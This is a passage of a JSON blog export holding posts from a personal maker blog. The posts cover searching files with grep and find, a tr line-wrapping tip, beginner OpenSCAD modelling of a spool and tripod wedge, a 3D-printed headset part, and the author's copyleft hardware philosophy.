setup.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-06-27T18:12:57.000Z","created_by":"1","updated_at":"2017-06-27T18:12:57.000Z","updated_by":"1","published_at":"2017-06-27T18:12:57.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332787","uuid":"437a47cd-c4de-412b-b850-730c3cbe2067","title":"Finding a single line of text in a large number of files within a folder in linux","slug":"finding-a-single-line-of-text-in-a-large-number-of-files-within-a-folder-in-linux","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nA few months ago, when I set up this WordPress theme, I used a CC-by-zero photo from ffcu.io as the background. I thought it very nice of Markus to provide these beautiful photographs at a discount, so I figured out how to edit my WordPress footer to include a brief credit. The problem is, I forgot how I did that, and a week or two ago, I decided to switch to a scalable vector graphic. I thought it was in the theme editor, but Ctrl+F found nothing. So I thought to myself, “I can go through this whole GUI menu and all the config files in the server to try to find that one line, or I could write a quick BASH script to do it for me…” So naturally I gave up on the former after about a minute or two and got to work on the latter. 5 minutes later I had found the line in the file I was looking for. I’ll walk you through piece by piece how it works, but if you’d like, you can just download it as a [*script*](https://madscientists.co/paste/a4/).\\n\\nSo since we’re looking for a string match in a single file, we’re naturally going to use *grep.* But in order to check every single file, we have to get a list of every single file that grep can understand. At first I used *ls -1R* to get the filenames, which prints one filename on each line, and looks recursively. Unfortunately, *ls* doesn’t print the full relative (or any) pathname. So any results in a deeper directory than the working directory are not searched by grep. To resolve this I used *find . -type f* which you can find out more about by typing *man find* then */-type[ENTER]*. Put simply, find will list all *files* in that it encounters, because grep gives an error if it’s told to search a directory.\\n\\nAlright so we’re a third of the way there – we have a list of files, now we need to format them and search them. Formatting is easy. If you’ve never used the linux program *tr*… well you will now I guess. *tr* basically does what *sed ‘s///’* does, but unlike *sed*, it can handle newlines. So all we need is to pipe the output of our *find* command to *tr “\\\\n” ” “*.\\n\\nBash has a very cool feature that lets you embed commands within commands. You do this by putting the command in $() and bash will do the stuff inside the parentheses first, then it will put the result of that back in place of the command. So if we put\\n\\nfind . -type f | tr \\\"\\\\n\\\" \\\" \\\"\\n\\ninside of $(), then anything outside that will see only a space-separated list of files, with the directories prepended. So that’s all we need then, nice!\\n\\ngrep -i \\\"case insensitive string to match\\\" $(find . -type f | tr \\\"\\\\n\\\" \\\" \\\")\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>A few months ago, when I set up this WordPress theme, I used a CC-by-zero photo from ffcu.io as the background. I thought it very nice of Markus to provide these beautiful photographs at a discount, so I figured out how to edit my WordPress footer to include a brief credit. The problem is, I forgot how I did that, and a week or two ago, I decided to switch to a scalable vector graphic. I thought it was in the theme editor, but Ctrl+F found nothing. So I thought to myself, “I can go through this whole GUI menu and all the config files in the server to try to find that one line, or I could write a quick BASH script to do it for me…” So naturally I gave up on the former after about a minute or two and got to work on the latter. 5 minutes later I had found the line in the file I was looking for. I’ll walk you through piece by piece how it works, but if you’d like, you can just download it as a <a href=\"https://madscientists.co/paste/a4/\"><em>script</em></a>.</p>\n<p>So since we’re looking for a string match in a single file, we’re naturally going to use <em>grep.</em> But in order to check every single file, we have to get a list of every single file that grep can understand. At first I used <em>ls -1R</em> to get the filenames, which prints one filename on each line, and looks recursively. Unfortunately, <em>ls</em> doesn’t print the full relative (or any) pathname. So any results in a deeper directory than the working directory are not searched by grep. To resolve this I used <em>find . -type f</em> which you can find out more about by typing <em>man find</em> then <em>/-type[ENTER]</em>. Put simply, find will list all <em>files</em> in that it encounters, because grep gives an error if it’s told to search a directory.</p>\n<p>Alright so we’re a third of the way there – we have a list of files, now we need to format them and search them. Formatting is easy. If you’ve never used the linux program <em>tr</em>… well you will now I guess. <em>tr</em> basically does what <em>sed ‘s///’</em> does, but unlike <em>sed</em>, it can handle newlines. So all we need is to pipe the output of our <em>find</em> command to <em>tr “\\n” ” “</em>.</p>\n<p>Bash has a very cool feature that lets you embed commands within commands. You do this by putting the command in $() and bash will do the stuff inside the parentheses first, then it will put the result of that back in place of the command. So if we put</p>\n<p>find . -type f | tr &quot;\\n&quot; &quot; &quot;</p>\n<p>inside of $(), then anything outside that will see only a space-separated list of files, with the directories prepended. So that’s all we need then, nice!</p>\n<p>grep -i &quot;case insensitive string to match&quot; $(find . -type f | tr &quot;\\n&quot; &quot; &quot;)</p>\n</div>","amp":"363","plaintext":"A few months ago, when I set up this WordPress theme, I used a CC-by-zero photo\nfrom ffcu.io as the background. I thought it very nice of Markus to provide\nthese beautiful photographs at a discount, so I figured out how to edit my\nWordPress footer to include a brief credit. The problem is, I forgot how I did\nthat, and a week or two ago, I decided to switch to a scalable vector graphic. I\nthought it was in the theme editor, but Ctrl+F found nothing. So I thought to\nmyself, “I can go through this whole GUI menu and all the config files in the\nserver to try to find that one line, or I could write a quick BASH script to do\nit for me…” So naturally I gave up on the former after about a minute or two and\ngot to work on the latter. 5 minutes later I had found the line in the file I\nwas looking for. I’ll walk you through piece by piece how it works, but if you’d\nlike, you can just download it as a script [https://madscientists.co/paste/a4/].\n\nSo since we’re looking for a string match in a single file, we’re naturally\ngoing to usegrep.  But in order to check every single file, we have to get a\nlist of every single file that grep can understand. At first I usedls -1R to get\nthe filenames, which prints one filename on each line, and looks recursively.\nUnfortunately,ls  doesn’t print the full relative (or any) pathname. So any\nresults in a deeper directory than the working directory are not searched by\ngrep. To resolve this I usedfind . -type f  which you can find out more about by\ntypingman find  then/-type[ENTER]. Put simply, find will list allfiles  in that\nit encounters, because grep gives an error if it’s told to search a directory.\n\nAlright so we’re a third of the way there – we have a list of files, now we need\nto format them and search them. Formatting is easy. If you’ve never used the\nlinux programtr… well you will now I guess.tr  basically does whatsed ‘s///’ \ndoes, but unlikesed, it can handle newlines. So all we need is to pipe the\noutput of ourfind  command totr “\\n” ” “.\n\nBash has a very cool feature that lets you embed commands within commands. You\ndo this by putting the command in $() and bash will do the stuff inside the\nparentheses first, then it will put the result of that back in place of the\ncommand. So if we put\n\nfind . -type f | tr \"\\n\" \" \"\n\ninside of $(), then anything outside that will see only a space-separated list\nof files, with the directories prepended. So that’s all we need then, nice!\n\ngrep -i \"case insensitive string to match\" $(find . -type f | tr \"\\n\" \" \")","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-06-28T07:13:40.000Z","created_by":"1","updated_at":"2017-12-03T15:51:16.000Z","updated_by":"1","published_at":"2017-06-28T07:13:40.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332788","uuid":"13fe716a-aaa2-4d4b-b9e0-2ffd685a1875","title":"Beginning 3D Modelling with OpenSCAD (and an attempt at Blender)","slug":"beginning-3d-modelling-with-openscad-and-an-attempt-at-blender","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nSo I took a look at Blender a couple of days together and decided that the interface was just too counterintuitive. At the same time, I heard a number of people recommend to anyone who would listen that OpenSCAD wasn’t nearly as daunting as it looked. So I buckled down and started looking through the tutorials. I’ve got a decent handle on the basics after designing two very simple objects.\\n\\nThe thing is, many people talked about how easy it is, and it is. For a specific-use scripting language like that to still be in use alongside very modern GUI workstations is a testament to that. But is it computer “aided” design? That is, is it any easier than getting out a compass and ruler and drawing your design on paper? I think not.\\n\\nFor one, the language is clunky, grammar-specific, and designed for people who like C-like languages, but it doesn’t have a decent editor built in. The only thing that makes it usable as a design tool is that you can see what you’re working on along side the code as you write it, as long as you save (and set a non-default menu option). So why wouldn’t they make this an interpretive language that reads what you’re saying, line by line, and parses it as you go? In fairness, there are [several](http://forum.openscad.org/openscadpy-tp1092p1093.html) python libraries for this, but that doesn’t solve the editor problem and the python implementations fractured and incomplete.\\n\\nI mean, I get that creating a 3d object with a 2d interface is a tough problem, it just feels like writing code shouldn’t be the only option. Blender is *a* GUI, but one of the most counterintuitive UIs I have ever seen. OpenSCAD is intuitive *if* you happen to have coded in Java or some other C-like before, but the overlap in 3d designers and programmers seems like it needn’t be large, so that doesn’t really make sense as an intuitive design structure, but it works for me. So I spent a few hours today learning how OpenSCAD deals with shapes, dimensions, modules, and positioning, and in the process developed a couple of quick, cool designs in order to learn how to use it.\\n\\nWhen I was working on learning how to use OpenSCAD this morning, I decided to come at it like I do most other programming solutions, and decided to solve a particular problem as an educational endeavor. So I began looking around the room for simple objects to model, I saw pen (too complex), a plain can (something that I would never print, plus it was too big), and a few other random objects before settling on the spool that my LED strips had come on. You can fork or clone my git repo of the design **[here](https://gitlab.com/theAssociationOfMadScientists/cad_spool/blob/master/spool.scad)**.\\n\\n<figure class=\\\"wp-caption alignleft\\\" id=\\\"attachment_378\\\" style=\\\"width: 155px\\\">[![a render of an 8-spoked wheel from openscad](https://madscientists.co/wp-content/uploads/2017/07/spool-300x225.jpg)](https://madscientists.co/wp-content/uploads/2017/07/spool.jpg)<figcaption class=\\\"wp-caption-text\\\">The original spool design – 8 spokes, 100mm outer diameter, 10mm thick, etc.</figcaption></figure>The interesting thing is that by initializing variable values at the top of the design to determine the various dimensions by clearly labelled is that the spool can then be resized to various dimensions by simply modifying the values at the top. That means that by being familiar with the design of one spool, I can easily adapt that same design to fit other purposes. Individually, the outer and inner diameters of the spool, the hole size, the size of the outside rim, the wall thickness, and the number and size of spokes can be quickly adjusted just by changing the values at the top. If you can extrapolate that concept further, you can imagine how this\\n\\n<figure class=\\\"wp-caption alignright\\\" id=\\\"attachment_379\\\" style=\\\"width: 150px\\\">[![A thicker and bigger around spool](https://madscientists.co/wp-content/uploads/2017/07/diffspool-150x150.jpg)](https://madscientists.co/wp-content/uploads/2017/07/diffspool.jpg)<figcaption class=\\\"wp-caption-text\\\">I changed a few values to make it a larger spool. For scale, this one is 15cm outer-diamter as opposed to 10cm for the other</figcaption></figure>makes for a powerful design engine, once an initial design is written.\\n\\nThe second design I made was a bit less versatile, but will probably be more useful to me. It is the wedge that connects a camera to a tripod, and takes a **¼-**20 screw. You can find that design **[here](https://gitlab.com/theAssociationOfMadScientists/cad_tripod_wedge/blob/master/tripod_wedge.scad).**\\n\\n \\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>So I took a look at Blender a couple of days together and decided that the interface was just too counterintuitive. At the same time, I heard a number of people recommend to anyone who would listen that OpenSCAD wasn’t nearly as daunting as it looked. So I buckled down and started looking through the tutorials. I’ve got a decent handle on the basics after designing two very simple objects.</p>\n<p>The thing is, many people talked about how easy it is, and it is. For a specific-use scripting language like that to still be in use alongside very modern GUI workstations is a testament to that. But is it computer “aided” design? That is, is it any easier than getting out a compass and ruler and drawing your design on paper? I think not.</p>\n<p>For one, the language is clunky, grammar-specific, and designed for people who like C-like languages, but it doesn’t have a decent editor built in. The only thing that makes it usable as a design tool is that you can see what you’re working on along side the code as you write it, as long as you save (and set a non-default menu option). So why wouldn’t they make this an interpretive language that reads what you’re saying, line by line, and parses it as you go? In fairness, there are <a href=\"http://forum.openscad.org/openscadpy-tp1092p1093.html\">several</a> python libraries for this, but that doesn’t solve the editor problem and the python implementations fractured and incomplete.</p>\n<p>I mean, I get that creating a 3d object with a 2d interface is a tough problem, it just feels like writing code shouldn’t be the only option. Blender is <em>a</em> GUI, but one of the most counterintuitive UIs I have ever seen. OpenSCAD is intuitive <em>if</em> you happen to have coded in Java or some other C-like before, but the overlap in 3d designers and programmers seems like it needn’t be large, so that doesn’t really make sense as an intuitive design structure, but it works for me. So I spent a few hours today learning how OpenSCAD deals with shapes, dimensions, modules, and positioning, and in the process developed a couple of quick, cool designs in order to learn how to use it.</p>\n<p>When I was working on learning how to use OpenSCAD this morning, I decided to come at it like I do most other programming solutions, and decided to solve a particular problem as an educational endeavor. So I began looking around the room for simple objects to model, I saw pen (too complex), a plain can (something that I would never print, plus it was too big), and a few other random objects before settling on the spool that my LED strips had come on. You can fork or clone my git repo of the design <strong><a href=\"https://gitlab.com/theAssociationOfMadScientists/cad_spool/blob/master/spool.scad\">here</a></strong>.</p>\n<figure class=\"wp-caption alignleft\" id=\"attachment_378\" style=\"width: 155px\">[![a render of an 8-spoked wheel from openscad](https://madscientists.co/wp-content/uploads/2017/07/spool-300x225.jpg)](https://madscientists.co/wp-content/uploads/2017/07/spool.jpg)<figcaption class=\"wp-caption-text\">The original spool design – 8 spokes, 100mm outer diameter, 10mm thick, etc.</figcaption></figure>The interesting thing is that by initializing variable values at the top of the design to determine the various dimensions by clearly labelled is that the spool can then be resized to various dimensions by simply modifying the values at the top. That means that by being familiar with the design of one spool, I can easily adapt that same design to fit other purposes. Individually, the outer and inner diameters of the spool, the hole size, the size of the outside rim, the wall thickness, and the number and size of spokes can be quickly adjusted just by changing the values at the top. If you can extrapolate that concept further, you can imagine how this\n<figure class=\"wp-caption alignright\" id=\"attachment_379\" style=\"width: 150px\">[![A thicker and bigger around spool](https://madscientists.co/wp-content/uploads/2017/07/diffspool-150x150.jpg)](https://madscientists.co/wp-content/uploads/2017/07/diffspool.jpg)<figcaption class=\"wp-caption-text\">I changed a few values to make it a larger spool. For scale, this one is 15cm outer-diamter as opposed to 10cm for the other</figcaption></figure>makes for a powerful design engine, once an initial design is written.\n<p>The second design I made was a bit less versatile, but will probably be more useful to me. It is the wedge that connects a camera to a tripod, and takes a **¼-**20 screw. You can find that design <strong><a href=\"https://gitlab.com/theAssociationOfMadScientists/cad_tripod_wedge/blob/master/tripod_wedge.scad\">here</a>.</strong></p>\n<p></p>\n</div>","amp":"361","plaintext":"So I took a look at Blender a couple of days together and decided that the\ninterface was just too counterintuitive. At the same time, I heard a number of\npeople recommend to anyone who would listen that OpenSCAD wasn’t nearly as\ndaunting as it looked. So I buckled down and started looking through the\ntutorials. I’ve got a decent handle on the basics after designing two very\nsimple objects.\n\nThe thing is, many people talked about how easy it is, and it is. For a\nspecific-use scripting language like that to still be in use alongside very\nmodern GUI workstations is a testament to that. But is it computer “aided”\ndesign? That is, is it any easier than getting out a compass and ruler and\ndrawing your design on paper? I think not.\n\nFor one, the language is clunky, grammar-specific, and designed for people who\nlike C-like languages, but it doesn’t have a decent editor built in. The only\nthing that makes it usable as a design tool is that you can see what you’re\nworking on along side the code as you write it, as long as you save (and set a\nnon-default menu option). So why wouldn’t they make this an interpretive\nlanguage that reads what you’re saying, line by line, and parses it as you go?\nIn fairness, there are several\n[http://forum.openscad.org/openscadpy-tp1092p1093.html] python libraries for\nthis, but that doesn’t solve the editor problem and the python implementations\nfractured and incomplete.\n\nI mean, I get that creating a 3d object with a 2d interface is a tough problem,\nit just feels like writing code shouldn’t be the only option. Blender isa  GUI,\nbut one of the most counterintuitive UIs I have ever seen. OpenSCAD is\nintuitiveif  you happen to have coded in Java or some other C-like before, but\nthe overlap in 3d designers and programmers seems like it needn’t be large, so\nthat doesn’t really make sense as an intuitive design structure, but it works\nfor me. So I spent a few hours today learning how OpenSCAD deals with shapes,\ndimensions, modules, and positioning, and in the process developed a couple of\nquick, cool designs in order to learn how to use it.\n\nWhen I was working on learning how to use OpenSCAD this morning, I decided to\ncome at it like I do most other programming solutions, and decided to solve a\nparticular problem as an educational endeavor. So I began looking around the\nroom for simple objects to model, I saw pen (too complex), a plain can\n(something that I would never print, plus it was too big), and a few other\nrandom objects before settling on the spool that my LED strips had come on. You\ncan fork or clone my git repo of the design here\n[https://gitlab.com/theAssociationOfMadScientists/cad_spool/blob/master/spool.scad]\n.\n\n[![a render of an 8-spoked wheel from\nopenscad](https://madscientists.co/wp-content/uploads/2017/07/spool-300x225.jpg)](https://madscientists.co/wp-content/uploads/2017/07/spool.jpg)\nThe original spool design – 8 spokes, 100mm outer diameter, 10mm thick, etc.The\ninteresting thing is that by initializing variable values at the top of the\ndesign to determine the various dimensions by clearly labelled is that the spool\ncan then be resized to various dimensions by simply modifying the values at the\ntop. That means that by being familiar with the design of one spool, I can\neasily adapt that same design to fit other purposes. Individually, the outer and\ninner diameters of the spool, the hole size, the size of the outside rim, the\nwall thickness, and the number and size of spokes can be quickly adjusted just\nby changing the values at the top. If you can extrapolate that concept further,\nyou can imagine how this[![A thicker and bigger around\nspool](https://madscientists.co/wp-content/uploads/2017/07/diffspool-150x150.jpg)](https://madscientists.co/wp-content/uploads/2017/07/diffspool.jpg)\nI changed a few values to make it a larger spool. For scale, this one is 15cm\nouter-diamter as opposed to 10cm for the othermakes for a powerful design\nengine, once an initial design is written.The second design I made was a bit\nless versatile, but will probably be more useful to me. It is the wedge that\nconnects a camera to a tripod, and takes a **¼-**20 screw. You can find that\ndesign here\n[https://gitlab.com/theAssociationOfMadScientists/cad_tripod_wedge/blob/master/tripod_wedge.scad]\n.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-07-05T08:30:44.000Z","created_by":"1","updated_at":"2017-07-05T08:30:44.000Z","updated_by":"1","published_at":"2017-07-05T08:30:44.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332789","uuid":"b2a883ed-442c-446b-b4df-18503e6a1161","title":"Modelling and Printing My First Replacement Part","slug":"modelling-and-printing-my-first-replacement-part","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI have relied on the Motorola Boom bluetooth headsets for more than a year. My first one fell out of my ear into someone’s yard while I was delivering package\\n\\n<figure class=\\\"wp-caption alignright\\\" id=\\\"attachment_383\\\" style=\\\"width: 300px\\\">[![Broken Phones](https://madscientists.co/wp-content/uploads/2017/07/DSC_4448web-300x158.jpg)](https://madscientists.co/wp-content/uploads/2017/07/DSC_4448web.jpg)<figcaption class=\\\"wp-caption-text\\\">My Motorola Boom headset has broken!</figcaption></figure>s, but I bought a replacement a few months later, and I wear it so much my sister has started to worry that I’ve become a Cyberman. Much to my dismay, the day before yesterday, the thing that gives the boom it’s biggest coolness factor – the flip-phone style flap that acts as a windscreen and power switch – broke right in my hand. I’ve been turning it off and on for the past couple of days by twisting the power-switch side with a pair of pliers. This won’t work long-term though; the pliers will wear down the plastic until it won’t twist anymore.\\n\\nAnyway, since it broke I’ve been hard at work on a 3D model of the piece, which is *very* small and should not have any problems printing in just a little while. The 3D model, on the other hand, was not nearly as easy of a task as this will be for my 3D printer. The original piece was very round and smooth; all of my designs so far have had hard corners. In fact, edge smoothing in OpenSCAD for 3D objects is surprisingly difficult, to the point where I decided to simply leave one of the dimension’s edges squared and file them down once the print is done. Possibly there is a more simple way to do this, I don’t know.\\n\\nThe rounding of the Z-axis edges was the only really big hiccup, there are 8 primitive shapes in three modules in this design, and both the *.scad* and *.stl* files are available on our GitLab repo, which conveniently has an interactive viewer for the *.stl* file. I will update this with photos of the final print once it has completed, and some information about that process, but I’ll get to that a little while later.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I have relied on the Motorola Boom bluetooth headsets for more than a year. My first one fell out of my ear into someone’s yard while I was delivering package</p>\n<figure class=\"wp-caption alignright\" id=\"attachment_383\" style=\"width: 300px\">[![Broken Phones](https://madscientists.co/wp-content/uploads/2017/07/DSC_4448web-300x158.jpg)](https://madscientists.co/wp-content/uploads/2017/07/DSC_4448web.jpg)<figcaption class=\"wp-caption-text\">My Motorola Boom headset has broken!</figcaption></figure>s, but I bought a replacement a few months later, and I wear it so much my sister has started to worry that I’ve become a Cyberman. Much to my dismay, the day before yesterday, the thing that gives the boom it’s biggest coolness factor – the flip-phone style flap that acts as a windscreen and power switch – broke right in my hand. I’ve been turning it off and on for the past couple of days by twisting the power-switch side with a pair of pliers. This won’t work long-term though; the pliers will wear down the plastic until it won’t twist anymore.\n<p>Anyway, since it broke I’ve been hard at work on a 3D model of the piece, which is <em>very</em> small and should not have any problems printing in just a little while. The 3D model, on the other hand, was not nearly as easy of a task as this will be for my 3D printer. The original piece was very round and smooth; all of my designs so far have had hard corners. In fact, edge smoothing in OpenSCAD for 3D objects is surprisingly difficult, to the point where I decided to simply leave one of the dimension’s edges squared and file them down once the print is done. Possibly there is a more simple way to do this, I don’t know.</p>\n<p>The rounding of the Z-axis edges was the only really big hiccup, there are 8 primitive shapes in three modules in this design, and both the <em>.scad</em> and <em>.stl</em> files are available on our GitLab repo, which conveniently has an interactive viewer for the <em>.stl</em> file. I will update this with photos of the final print once it has completed, and some information about that process, but I’ll get to that a little while later.</p>\n</div>","amp":"381","plaintext":"I have relied on the Motorola Boom bluetooth headsets for more than a year. My\nfirst one fell out of my ear into someone’s yard while I was delivering package\n\n[![Broken\nPhones](https://madscientists.co/wp-content/uploads/2017/07/DSC_4448web-300x158.jpg)](https://madscientists.co/wp-content/uploads/2017/07/DSC_4448web.jpg)\nMy Motorola Boom headset has broken!s, but I bought a replacement a few months\nlater, and I wear it so much my sister has started to worry that I’ve become a\nCyberman. Much to my dismay, the day before yesterday, the thing that gives the\nboom it’s biggest coolness factor – the flip-phone style flap that acts as a\nwindscreen and power switch – broke right in my hand. I’ve been turning it off\nand on for the past couple of days by twisting the power-switch side with a pair\nof pliers. This won’t work long-term though; the pliers will wear down the\nplastic until it won’t twist anymore.Anyway, since it broke I’ve been hard at\nwork on a 3D model of the piece, which isvery  small and should not have any\nproblems printing in just a little while. The 3D model, on the other hand, was\nnot nearly as easy of a task as this will be for my 3D printer. The original\npiece was very round and smooth; all of my designs so far have had hard corners.\nIn fact, edge smoothing in OpenSCAD for 3D objects is surprisingly difficult, to\nthe point where I decided to simply leave one of the dimension’s edges squared\nand file them down once the print is done. Possibly there is a more simple way\nto do this, I don’t know.\n\nThe rounding of the Z-axis edges was the only really big hiccup, there are 8\nprimitive shapes in three modules in this design, and both the .scad  and .stl \nfiles are available on our GitLab repo, which conveniently has an interactive\nviewer for the .stl  file. I will update this with photos of the final print\nonce it has completed, and some information about that process, but I’ll get to\nthat a little while later.","feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-07-14T14:25:37.000Z","created_by":"1","updated_at":"2017-09-12T04:25:38.000Z","updated_by":"1","published_at":"2018-09-04T15:10:14.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133278a","uuid":"910aaf33-31fc-4be3-ae62-e621e242682b","title":"Quick tip for linux","slug":"quick-tip-for-linux","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nApparently my theme doesn’t support ‘code formatting’ on the main page, so click “read more” to see the command more clearly.\\n\\nIf you have a text file that has enter lines to simulate wrapping and you want to actually wrap it, you can run  \\n`cat file | tr '\\\\n\\\\n' '`' | tr -t '\\\\n' '' | tr '`' '\\\\n\\\\n'`  \\n That assumes you don’t have any `s in your file (that’s the key to the left of the one, not the normal apostrophe), which you can grep for. It could also be a longer string if you have every character used in your file. The key is setting any double returns to some other value before deleting the ugly newlines, so that you can change it back.\\n\\ntr is really great.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>Apparently my theme doesn’t support ‘code formatting’ on the main page, so click “read more” to see the command more clearly.</p>\n<p>If you have a text file that has enter lines to simulate wrapping and you want to actually wrap it, you can run<br>\n<code>cat file | tr '\\n\\n' '</code>' | tr -t '\\n' '' | tr '<code>' '\\n\\n'</code><br>\nThat assumes you don’t have any `s in your file (that’s the key to the left of the one, not the normal apostrophe), which you can grep for. It could also be a longer string if you have every character used in your file. The key is setting any double returns to some other value before deleting the ugly newlines, so that you can change it back.</p>\n<p>tr is really great.</p>\n</div>","amp":"394","plaintext":"Apparently my theme doesn’t support ‘code formatting’ on the main page, so click\n“read more” to see the command more clearly.\n\nIf you have a text file that has enter lines to simulate wrapping and you want\nto actually wrap it, you can run\ncat file | tr '\\n\\n' '' | tr -t '\\n' '' | tr '' '\\n\\n'\nThat assumes you don’t have any `s in your file (that’s the key to the left of\nthe one, not the normal apostrophe), which you can grep for. It could also be a\nlonger string if you have every character used in your file. The key is setting\nany double returns to some other value before deleting the ugly newlines, so\nthat you can change it back.\n\ntr is really great.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-07-17T01:34:19.000Z","created_by":"1","updated_at":"2017-07-17T01:34:19.000Z","updated_by":"1","published_at":"2017-07-17T01:34:19.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133278b","uuid":"a8e37dc5-2fc6-4a66-89b7-5082caf75887","title":"Why I changed the slogan","slug":"temp-slug-39","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nThe slogan at the top of the blog used to be “Perpetual students working to benefit humanity” and I think that is way too wordy. Additionally, I’d like to start focusing our (i.e. my) efforts on a more concrete goal. That is not to say that our goal has changed. The Association stands for scientific study for the sake of scientific study; for the pursuit of any knowledge that has potential to benefit humanity. However, I feel it’s more direct, concise, and understandable to the layperson to refer to this study as “solving problems”.\\n\\nThis is something I’ve been considering for some time, as it’s a key differentiating point between us and for profit as well as many not-for-profit organizations. Most businesses try to maintain a particular focus. Distribute a product, find a niche, and then keep working on it. A great example of a company that doesn’t need to do this is Twitter. Twitter should finalize itself, move to a skeleton crew to maintain that, and with such a greatly reduced cost (and also by not trying to maximize profit), they could continue to exist as an influential and important social construct. Instead they’re likely to continue trying to ‘innovate’ and iterate on an already solved problem. We don’t need new designs of washing machines, new recipes for soap, new inkjet printers. These problems – washing clothes, cleaning, and printing to paper from computers – have been solved. Why are we trying to continue to profit off of these utilities whenever we could instead optimize *efficiency*. So, if I create a product, I release the source and design fully open, with a copy-left license. Then, if someone comes along with a way to make that more efficient, they make some modifications and produce it that way, and so do we, passing the savings along to our customers.\\n\\nNow, this concept doesn’t take into account growth, which we will need to do. I’m only one person, and if I try to solve all of the problems myself, I’ll be dead before I get a millionth of the way through. Over time, we’ll need to hire, expand, rent or purchase space; all of the usual costs of doing business. Currently, we’re a few shitty computers and a 3D printer in my living room, and that’s not really sustainable long-term. So, yes, there will of course be a profit margin, but by forming as a non-profit or other similar entity, and by being open about all of our manufacturing processes, we can ensure that that margin won’t become unfair. By utilizing copyleft licenses, we can ensure the future of the Association will remain intact, by utilizing existing patent and copyright laws to ensure openness of derivatives.\\n\\nLet me give you an example. The Arduino company released their microcontrollers as an open design. Immediately, clones came up, and the $35 Uno that I have can be bought as a clone for less than $3. We intend to allow that situation to play out, and then clone the clones, putting us on the same level as the clones. If we were to do that without a copyleft license, by using the creative commons, for example, we could be sued by the clone company for the patent claim on *their* clone of our product. Copyleft has shown to be a huge help in this situation for software, and I want to use the association to bring that concept to hardware.\\n\\nAgain, this does require growth, so other organizations who are already established or for some other reason are able to produce the product at a lower profit margin than we are, they will be able to produce it more cheaply. However, I intend to construct the Association so as to assure that money that comes in *must* be kept in it, banning the profit motive, but that would require a lawyer (which I don’t have the funds for currently). Doing so would also prevent us from seeking investment, which could pose sustainability issues, but I’m prepared to accept that risk.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>The slogan at the top of the blog used to be “Perpetual students working to benefit humanity” and I think that is way too wordy. Additionally, I’d like to start focusing our (i.e. my) efforts on a more concrete goal. That is not to say that our goal has changed. The Association stands for scientific study for the sake of scientific study; for the pursuit of any knowledge that has potential to benefit humanity. However, I feel it’s more direct, concise, and understandable to the layperson to refer to this study as “solving problems”.</p>\n<p>This is something I’ve been considering for some time, as it’s a key differentiating point between us and for profit as well as many not-for-profit organizations. Most businesses try to maintain a particular focus. Distribute a product, find a niche, and then keep working on it. A great example of a company that doesn’t need to do this is Twitter. Twitter should finalize itself, move to a skeleton crew to maintain that, and with such a greatly reduced cost (and also by not trying to maximize profit), they could continue to exist as an influential and important social construct. Instead they’re likely to continue trying to ‘innovate’ and iterate on an already solved problem. We don’t need new designs of washing machines, new recipes for soap, new inkjet printers. These problems – washing clothes, cleaning, and printing to paper from computers – have been solved. Why are we trying to continue to profit off of these utilities whenever we could instead optimize <em>efficiency</em>. So, if I create a product, I release the source and design fully open, with a copy-left license. Then, if someone comes along with a way to make that more efficient, they make some modifications and produce it that way, and so do we, passing the savings along to our customers.</p>\n<p>Now, this concept doesn’t take into account growth, which we will need to do. I’m only one person, and if I try to solve all of the problems myself, I’ll be dead before I get a millionth of the way through. Over time, we’ll need to hire, expand, rent or purchase space; all of the usual costs of doing business. Currently, we’re a few shitty computers and a 3D printer in my living room, and that’s not really sustainable long-term. So, yes, there will of course be a profit margin, but by forming as a non-profit or other similar entity, and by being 